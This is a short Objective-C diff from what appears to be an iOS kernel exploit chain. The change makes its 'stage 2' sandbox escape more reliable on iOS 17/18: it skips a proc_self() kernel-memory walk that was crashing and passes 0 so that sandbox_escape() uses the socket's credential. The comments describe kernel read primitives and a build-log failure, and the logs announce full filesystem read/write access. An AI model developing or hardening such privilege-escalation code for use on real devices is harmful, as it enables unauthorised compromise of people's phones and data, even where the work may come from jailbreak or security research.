@@ -145,7 +145,14 @@ BOOL wq_kernel_start(void)
     // (so_background_thread is 0 on iOS 17/18) is no longer fatal: the
     // credential our own socket carries is the object the sandbox lives in.
     wq_log(@"kernel: stage 2/2, sandbox escape (sandbox_escape)");
-    uint64_t selfProc = proc_self();
+    // proc_self() walks the socket's so_background_thread field. On iOS 17/18
+    // that field is usually 0; when it holds a stale non-zero value, the
+    // speculative kread hits an unmapped address and early_kread aborts before
+    // the credential fallback can run (build 8 log: getsockopt failed in
+    // wq_proc_from_thread). Stage 2 only needs the socket credential, so skip
+    // the optional proc walk and let sandbox_escape(0) use ucred_self().
+    uint64_t selfProc = 0;
+    wq_log(@"kernel: stage 2 uses the socket credential (proc walk skipped)");
     // sandbox_escape() already writes, reads back and deletes probe files; it
     // returns 0 only when that probe passed, so trust it here.
     int escape = sandbox_escape(selfProc);
@@ -172,7 +179,7 @@ BOOL wq_kernel_start(void)
     if (active) {
         wq_log(@"kernel: sandbox escaped; full filesystem read/write is available");
     } else if (selfProc == 0) {
-        wq_log(@"kernel: proc_self() returned 0 and the socket credential did not escape; the chain is not active");
+        wq_log(@"kernel: no proc was resolved and the socket credential did not escape; the chain is not active");
     } else {
         wq_log(@"kernel: sandbox_escape returned %d; the chain is not active", escape);
     }
